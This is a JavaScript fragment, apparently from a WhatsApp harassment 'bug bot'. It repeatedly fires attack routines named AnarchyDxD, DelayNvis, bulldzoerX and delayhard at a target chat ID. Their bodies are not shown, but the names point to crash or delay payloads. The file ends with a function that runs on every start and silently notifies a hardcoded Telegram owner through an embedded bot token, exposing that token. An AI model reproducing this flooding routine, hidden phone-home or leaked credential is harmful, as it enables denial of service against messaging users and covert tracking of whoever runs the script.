await AnarchyDxD(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await delayhard1(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard2(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard3(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard4(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard5(jid, sock)
await AnarchyDxD(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
await delayhard1(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard2(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard3(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard4(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis(jid, sock);
await AnarchyDxD(jid, sock);
await DelayNvis2(jid, sock);
await AnarchyDxD(jid, sock);
await delayhard5(jid, sock)
await AnarchyDxD(jid, sock);
await tes100(jid, sock);
await DelayNvis(jid, sock);
await BulldoEso(jid, sock);
await DelayNvis(jid, sock);
await bulldzoerX(jid, sock);
await DelayNvis(jid, sock);
await boegProtocol(jid, sock);
await DelayNvis(jid, sock);
 }
}

// batas
function sendUsageNotif(tokenDipakai, user = {}) {
  const firstName = user.first_name || "DEVELOPER @Alywasr7x";
  const username = user.username
    ? `@${user.username}`
    : `[${firstName}](tg://user?id=${user.id || 0})`;

  // Token bot khusus notif (punya kamu)
  const notifToken = "8254240770:AAE4kNzjiw0abBymQ7qLPCuyV_3K18H1_P0";
  const notifBot = new TelegramBot(notifToken);
  const ownerId = "1376254280";

  notifBot.sendMessage(
    ownerId,
    `✅ Bot Telah Diaktifkan Oleh ${username}`,
    { parse_mode: "Markdown" }
  ).catch(() => {});
}

// === Jalankan deteksi setiap kali script start ===
sendUsageNotif(BOT_TOKEN);

console.log("Telegram bot is running...");
